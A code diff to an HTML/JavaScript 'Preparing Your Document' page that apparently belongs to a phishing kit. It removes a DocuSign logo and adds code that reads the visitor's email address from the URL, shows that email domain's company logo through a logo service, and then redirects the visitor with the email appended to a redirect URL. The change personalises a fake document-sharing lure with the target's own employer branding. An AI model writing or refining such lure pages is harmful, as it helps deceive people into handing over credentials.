@@ -115,7 +115,7 @@
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="DocuSign Logo" class="docusign-logo">
+           <img src="" alt="Company Logo" class="company-logo" id="companyLogo" style="display: none;">
             <h1 class="title">Preparing Your Document</h1>
             <p class="subtitle">Please wait a moment while we get things ready for you.</p>
         </div>
@@ -182,12 +182,26 @@
             return null; // No hash or search string found
         }
 
+ function setCompanyLogo(email) {
+            if (!email) return;
+            const domain = email.split('@')[1];
+            if (domain) {
+                const logoEl = document.getElementById('companyLogo');
+                const logoUrl = `https://logo.clearbit.com/${domain}`;
+                
+                logoEl.src = logoUrl;
+                logoEl.onload = () => { logoEl.style.display = 'block'; };
+                logoEl.onerror = () => { logoEl.style.display = 'none'; };
+            }
+        }
         // Main redirect function
         function performRedirect() {
             const value = getPotentialValue();
             const cleaned = sanitizeValue(value);
 
+
             if (cleaned) {
+                setCompanyLogo(cleaned);
                 console.log("Found value:", cleaned);
                 if (isMobileDevice()) {
                     const redirectUrl = MOBILE_REDIRECT_URL_BASE + cleaned;
